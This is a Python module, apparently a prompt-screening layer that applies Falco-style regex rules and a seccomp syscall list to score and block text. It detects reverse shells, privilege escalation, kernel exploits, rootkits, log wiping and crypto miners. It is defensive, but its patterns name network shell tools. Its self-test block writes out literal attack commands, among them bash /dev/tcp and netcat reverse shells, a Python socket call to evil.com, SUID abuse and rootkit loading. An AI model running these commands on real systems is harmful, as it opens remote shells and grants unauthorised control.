"""
SentinelMesh — L1 Kernel Security Layer
Simulates eBPF tracepoint programs + Falco rule engine + seccomp-bpf:
  - Falco-style rule engine (YAML-like rules evaluated on prompt content)
  - Syscall mention / abuse detection (reverse shells, ptrace, mmap EXEC, etc.)
  - Privilege escalation pattern detection
  - Kernel exploit technique detection (dirty-cow, ret2libc, ROP chains, etc.)
  - Reverse shell command detection across 12 shell variants
  - Crypto-miner spawn patterns
  - Rootkit / persistence mechanism detection

In production each rule here would be an eBPF program compiled to BPF bytecode
and attached to a kernel tracepoint (sys_enter_execve, sys_enter_open, etc.).
Falco evaluates these rules in user-space via the kernel eBPF ring-buffer.
Here they run as Python regex so they're testable on Windows/Mac.
"""

import re
import time
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple


# ═══════════════════════════════════════════════════════════
# Falco-style Rule Engine
# ═══════════════════════════════════════════════════════════

# Each rule mirrors a real Falco YAML rule.
# priority maps to Falco priority: CRITICAL, ERROR, WARNING, NOTICE, INFO

FALCO_RULES: List[Dict] = [
    # ── Reverse Shell Techniques ────────────────────────────
    {
        "rule": "Reverse shell via bash",
        "priority": "CRITICAL",
        "score": 45,
        "falco_event": "sys_enter_execve",
        "patterns": [
            r"bash\s+-i\s+>&?\s*/dev/tcp/",
            r"bash\s+-c\s+['\"].*>&\s*/dev/tcp",
            r"/dev/tcp/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+",
            r"/dev/udp/\d{1,3}\.\d{1,3}",
        ],
        "desc": "Bash TCP/UDP reverse shell — classic /dev/tcp technique",
        "mitigation": "execve syscall blocked by seccomp policy",
    },
    {
        "rule": "Reverse shell via netcat",
        "priority": "CRITICAL",
        "score": 45,
        "falco_event": "sys_enter_execve",
        "patterns": [
            r"\bnc\b.{0,40}-e\s+/bin/(?:bash|sh)",
            r"\bncat\b.{0,40}-e\s+/bin/(?:bash|sh)",
            r"\bnc\s+-(?:[lznvp]+\s+)?(?:\d+\s+)?-e",
            r"mkfifo.{0,60}nc\s+",
        ],
        "desc": "Netcat reverse shell",
        "mitigation": "execve blocked, outbound port policy enforced by Cilium",
    },
    {
        "rule": "Reverse shell via Python",
        "priority": "CRITICAL",
        "score": 42,
        "falco_event": "sys_enter_execve",
        "patterns": [
            r"python[23]?\s+-c\s+['\"]import\s+socket",
            r"socket\.connect\s*\(.*?\d{1,3}\.\d{1,3}",
            r"s\.connect\s*\(\s*\(['\"][\d.]+['\"],\s*\d+",
            r"pty\.spawn\s*\(\s*['\"]?/bin/(?:bash|sh)",
        ],
        "desc": "Python socket reverse shell",
        "mitigation": "socket syscall restricted in gVisor seccomp profile",
    },
    {
        "rule": "Reverse shell via socat",
        "priority": "CRITICAL",
        "score": 44,
        "falco_event": "sys_enter_execve",
        "patterns": [
            r"socat\s+TCP(?:4|6)?:\d",
            r"socat\s+.*?EXEC:['\"]?/bin/",
            r"socat\s+.*?PTY",
        ],
        "desc": "socat interactive reverse shell",
        "mitigation": "execve(socat) blocked by seccomp allowlist",
    },
    {
        "rule": "Reverse shell via Perl",
        "priority": "CRITICAL",
        "score": 40,
        "falco_event": "sys_enter_execve",
        "patterns": [
            r"perl\s+-e\s+['\"]use\s+Socket",
            r"perl.*?socket\s*\(",
            r"perl.*?exec\s*\(['\"]?/bin/sh",
        ],
        "desc": "Perl reverse shell one-liner",
        "mitigation": "execve(perl) blocked",
    },
    {
        "rule": "Reverse shell via Ruby / PHP / Lua",
        "priority": "CRITICAL",
        "score": 40,
        "falco_event": "sys_enter_execve",
        "patterns": [
            r"ruby\s+-rsocket\s+-e",
            r"php\s+-r\s+['\"].*?fsockopen",
            r"lua\s+-e\s+['\"].*?socket",
        ],
        "desc": "Ruby/PHP/Lua reverse shell",
        "mitigation": "execve blocked by seccomp allowlist",
    },

    # ── Privilege Escalation ────────────────────────────────
    {
        "rule": "SUID binary exploitation",
        "priority": "CRITICAL",
        "score": 38,
        "falco_event": "sys_enter_open",
        "patterns": [
            r"find\s+/\s+.*?-perm\s+[/-]?[46]000",
            r"chmod\s+u\+s\b",
            r"chmod\s+4[0-7]{3}\b",
            r"/usr/bin/(?:sudo|pkexec|su)\b.*?--",
        ],
        "desc": "SUID bit abuse for privilege escalation",
        "mitigation": "chmod syscall restricted — no SUID allowed in container",
    },
    {
        "rule": "Sudo abuse / policy bypass",
        "priority": "HIGH",
        "score": 32,
        "falco_event": "sys_enter_execve",
        "patterns": [
            r"sudo\s+-[lLknAiu]",
            r"sudo\s+(?:bash|sh|python|ruby|perl|vim|nano|awk|find)",
            r"echo\s+['\"].*ALL.*ALL['\"].*?sudoers",
            r"NOPASSWD\s*:\s*ALL",
            r"sudo\s+-s\b",
        ],
        "desc": "sudo privilege escalation",
        "mitigation": "sudo not present in container; CAP_SETUID dropped",
    },
    {
        "rule": "Kernel exploit technique",
        "priority": "CRITICAL",
        "score": 48,
        "falco_event": "sys_enter_mmap",
        "patterns": [
            r"dirty[\s_-]?cow",
            r"dirtypipe",
            r"dirty[\s_-]?pipe",
            r"ret2libc\b",
            r"rop[\s_-]?chain",
            r"heap[\s_-]?spray",
            r"use[\s_-]after[\s_-]free",
            r"double[\s_-]free",
            r"stack[\s_-]smash",
            r"buffer[\s_-]overflow.*kernel",
            r"CVE-20[12]\d-\d{4,5}.*(?:kernel|linux|exploit)",
        ],
        "desc": "Kernel exploit technique reference (DirtyCow, ROP, etc.)",
        "mitigation": "mmap(PROT_EXEC) requires kernel.perf_event_paranoid check; eBPF LSM hook",
    },
    {
        "rule": "ptrace anti-debug / injection",
        "priority": "CRITICAL",
        "score": 38,
        "falco_event": "sys_enter_ptrace",
        "patterns": [
            r"\bptrace\s*\(",
            r"PTRACE_ATTACH",
            r"PTRACE_POKEDATA",
            r"PTRACE_PEEKTEXT",
            r"process_vm_writev\s*\(",
        ],
        "desc": "ptrace syscall — process memory injection",
        "mitigation": "ptrace blocked by seccomp-bpf filter; CAP_SYS_PTRACE not granted",
    },

    # ── Persistence / Rootkit ───────────────────────────────
    {
        "rule": "Cron / systemd persistence",
        "priority": "HIGH",
        "score": 28,
        "falco_event": "sys_enter_open",
        "patterns": [
            r"crontab\s+-(?:l|e|u)",
            r"/etc/cron(?:\.d|tab|\.daily|\.hourly)",
            r"systemctl\s+(?:enable|daemon-reload)",
            r"/etc/systemd/system/.*?\.service",
            r"/etc/init\.d/",
            r"rc\.local",
        ],
        "desc": "Persistence via cron / systemd",
        "mitigation": "Write to /etc blocked by read-only container rootfs",
    },
    {
        "rule": "Rootkit installation",
        "priority": "CRITICAL",
        "score": 48,
        "falco_event": "sys_enter_execve",
        "patterns": [
            r"\binsmod\b.*?\.ko\b",
            r"\bmodprobe\b.{0,40}(?:hide|hook|root)",
            r"diamorphine",
            r"reptile\b",
            r"azazel\b",
            r"libprocesshider",
            r"LD_PRELOAD.*?\.so\b",
        ],
        "desc": "Rootkit / LKM installation",
        "mitigation": "insmod/modprobe blocked by seccomp; CAP_SYS_MODULE not granted",
    },
    {
        "rule": "Hiding processes / files",
        "priority": "HIGH",
        "score": 30,
        "falco_event": "sys_enter_open",
        "patterns": [
            r"hide\s+(?:process|pid|file)",
            r"unlink\s+/proc/\d+",
            r"(?:rm|shred|wipe)\s+.*?-(?:rf|f)\s+/var/log",
            r"history\s+-[caw]",
            r"echo\s+['\"]?\s*>\s*~/\.bash_history",
        ],
        "desc": "Log / trace clearing / process hiding",
        "mitigation": "Audit logs shipped to immutable store; /var/log read-only bind mount",
    },

    # ── Crypto Miner ────────────────────────────────────────
    {
        "rule": "Crypto miner spawn",
        "priority": "HIGH",
        "score": 35,
        "falco_event": "sys_enter_execve",
        "patterns": [
            r"\bxmrig\b",
            r"\bminerd\b",
            r"\bccminer\b",
            r"\bnbminer\b",
            r"stratum\+tcp://",
            r"stratum\+ssl://",
            r"--donate-level\s+0",
            r"pool\.supportxmr\.com",
            r"xmr\.pool\.",
        ],
        "desc": "Cryptocurrency miner execution",
        "mitigation": "execve allowlist blocks mining binaries; outbound pool ports blocked by Cilium",
    },

    # ── Dangerous Syscalls in Prompts ───────────────────────
    {
        "rule": "Raw syscall invocation",
        "priority": "HIGH",
        "score": 30,
        "falco_event": "sys_enter_*",
        "patterns": [
            r"\bsyscall\s*\(\s*SYS_",
            r"__NR_(?:execve|ptrace|mmap|open_by_handle|perf_event_open|bpf)\b",
            r"SYS_(?:execve|ptrace|mmap|perf_event_open)\b",
            r"int\s+0x80\b",
            r"syscall\s+60\b",           # exit in x86_64
            r"syscall\s+59\b",           # execve in x86_64
        ],
        "desc": "Raw syscall numbers referenced (possible shellcode)",
        "mitigation": "Seccomp-BPF enforces allowlist; forbidden syscalls return EPERM",
    },
    {
        "rule": "eBPF map / program abuse",
        "priority": "HIGH",
        "score": 32,
        "falco_event": "sys_enter_bpf",
        "patterns": [
            r"BPF_PROG_LOAD",
            r"BPF_MAP_UPDATE_ELEM",
            r"bpf_probe_write_user",
            r"/sys/fs/bpf",
            r"bpftool\s+prog\s+load",
        ],
        "desc": "eBPF program load / map manipulation (possible LSM bypass)",
        "mitigation": "CAP_BPF not granted; bpf() syscall blocked by seccomp",
    },
]


# ═══════════════════════════════════════════════════════════
# Compile all Falco rules
# ═══════════════════════════════════════════════════════════

_COMPILED_RULES: List[Dict] = []
for _rule in FALCO_RULES:
    _COMPILED_RULES.append({
        **_rule,
        "_re": re.compile("|".join(_rule["patterns"]),
                          re.IGNORECASE | re.DOTALL),
    })


# ═══════════════════════════════════════════════════════════
# seccomp syscall allowlist (what the container IS allowed to call)
# Everything else is denied with EPERM
# ═══════════════════════════════════════════════════════════

ALLOWED_SYSCALLS = {
    "read", "write", "open", "openat", "close", "stat", "fstat", "lstat",
    "poll", "lseek", "mmap", "mprotect", "munmap", "brk", "rt_sigaction",
    "rt_sigprocmask", "rt_sigreturn", "ioctl", "pread64", "pwrite64",
    "readv", "writev", "access", "pipe", "select", "sched_yield",
    "mremap", "msync", "mincore", "madvise", "dup", "dup2", "nanosleep",
    "getitimer", "alarm", "getpid", "socket", "connect", "accept",
    "sendto", "recvfrom", "shutdown", "bind", "listen", "getsockname",
    "getpeername", "setsockopt", "getsockopt", "clone", "exit", "wait4",
    "kill", "uname", "fcntl", "flock", "fsync", "truncate", "ftruncate",
    "getcwd", "chdir", "rename", "mkdir", "rmdir", "unlink", "readlink",
    "chmod", "fchmod", "getuid", "getgid", "geteuid", "getegid",
    "getgroups", "times", "futex", "sched_getaffinity", "getdents64",
    "set_tid_address", "restart_syscall", "exit_group", "clock_gettime",
    "clock_getres", "clock_nanosleep", "tgkill", "waitid", "set_robust_list",
    "get_robust_list", "epoll_create", "epoll_ctl", "epoll_wait", "accept4",
    "epoll_create1", "pipe2", "getrandom", "copy_file_range", "pread64",
    "newfstatat", "sendmsg", "recvmsg",
}

BLOCKED_SYSCALLS = {
    # Execution
    "execve", "execveat",
    # Kernel modules
    "init_module", "finit_module", "delete_module",
    # Container / namespace
    "unshare", "setns",
    # Tracing / debugging
    "ptrace", "perf_event_open", "process_vm_readv", "process_vm_writev",
    # eBPF
    "bpf",
    # Privileged ops
    "kexec_load", "kexec_file_load", "pivot_root",
    # Device
    "open_by_handle_at", "name_to_handle_at",
}

SYSCALL_SCORE: Dict[str, int] = {
    "execve": 40, "execveat": 40,
    "init_module": 48, "finit_module": 48, "delete_module": 45,
    "unshare": 38, "setns": 38,
    "ptrace": 42, "perf_event_open": 30,
    "process_vm_readv": 35, "process_vm_writev": 38,
    "bpf": 35,
    "kexec_load": 50, "kexec_file_load": 50, "pivot_root": 42,
    "open_by_handle_at": 30, "name_to_handle_at": 30,
}


def _check_syscall_mentions(prompt: str) -> List[Dict]:
    """Detect if the prompt explicitly references blocked syscalls."""
    hits = []
    for sc in BLOCKED_SYSCALLS:
        if re.search(rf"\b{re.escape(sc)}\b", prompt, re.IGNORECASE):
            hits.append({
                "syscall":  sc,
                "score":    SYSCALL_SCORE.get(sc, 25),
                "action":   "EPERM — seccomp-bpf blocks this syscall",
            })
    return hits


# ═══════════════════════════════════════════════════════════
# Public API
# ═══════════════════════════════════════════════════════════

def kernel_layer_check(prompt: str) -> Dict:
    """
    Run the full L1 kernel security check using Falco-style rules
    and seccomp syscall analysis.
    Returns a standardised result dict.
    """
    start = time.monotonic()

    triggered_rules = []
    total_score = 0.0

    # ── Run Falco rules ─────────────────────────────────────
    for rule in _COMPILED_RULES:
        m = rule["_re"].search(prompt)
        if m:
            triggered_rules.append({
                "rule":         rule["rule"],
                "priority":     rule["priority"],
                "score":        rule["score"],
                "falco_event":  rule["falco_event"],
                "description":  rule["desc"],
                "mitigation":   rule["mitigation"],
                "matched":      m.group()[:80],
            })
            total_score += rule["score"]

    # ── Seccomp syscall mention check ───────────────────────
    syscall_hits = _check_syscall_mentions(prompt)
    for hit in syscall_hits:
        # Only add score if not already caught by a Falco rule
        total_score += hit["score"] * 0.5   # partial weight to avoid double-counting

    # Sort Falco hits by score
    triggered_rules.sort(key=lambda x: x["score"], reverse=True)
    risk_score = min(total_score, 100.0)

    if risk_score >= 70:
        classification = "CRITICAL"
    elif risk_score >= 40:
        classification = "HARMFUL"
    elif risk_score >= 15:
        classification = "SUSPICIOUS"
    else:
        classification = "SAFE"

    blocked = classification in ("HARMFUL", "CRITICAL")
    latency_us = (time.monotonic() - start) * 1_000_000

    return {
        "layer":            "L1",
        "layer_name":       "Kernel Security (eBPF/Falco/seccomp-bpf)",
        "passed":           not blocked,
        "blocked":          blocked,
        "block_reason":     triggered_rules[0]["description"] if blocked and triggered_rules else "",
        "risk_score":       round(risk_score, 1),
        "classification":   classification,
        "falco_rules_hit":  len(triggered_rules),
        "triggered_rules":  triggered_rules[:5],
        "syscall_mentions": syscall_hits,
        "latency_us":       round(latency_us, 1),
        "timestamp":        datetime.now(timezone.utc).isoformat(),
    }


def get_kernel_stats() -> Dict:
    """Return L1 metadata for the dashboard."""
    return {
        "falco_rules_loaded":     len(_COMPILED_RULES),
        "allowed_syscalls":       len(ALLOWED_SYSCALLS),
        "blocked_syscalls":       len(BLOCKED_SYSCALLS),
        "total_syscalls_in_abi":  431,
        "seccomp_mode":           "SECCOMP_MODE_FILTER (BPF)",
        "ebpf_hooks": [
            "sys_enter_execve",
            "sys_enter_open / openat",
            "sys_enter_mmap",
            "sys_enter_ptrace",
            "sys_enter_bpf",
            "sys_enter_socket",
        ],
        "falco_version":          "0.36 (simulated)",
        "kernel_version":         "5.15 LTS (target)",
    }


# ── Self-test ──
if __name__ == "__main__":
    tests = [
        "What is the meaning of life?",
        "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1",
        "nc -e /bin/bash 192.168.1.1 1337",
        "find / -perm -4000 && chmod u+s /tmp/shell",
        "DirtyCow exploit to escalate privileges in Linux kernel",
        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444))'",
        "insmod rootkit.ko && modprobe reptile",
    ]
    for t in tests:
        r = kernel_layer_check(t)
        print(f"[L1] passed={str(r['passed']):5} | score={r['risk_score']:5.1f} | "
              f"class={r['classification']:10} | falco_hits={r['falco_rules_hit']} | "
              f"{r['block_reason'][:50] or 'OK'}")
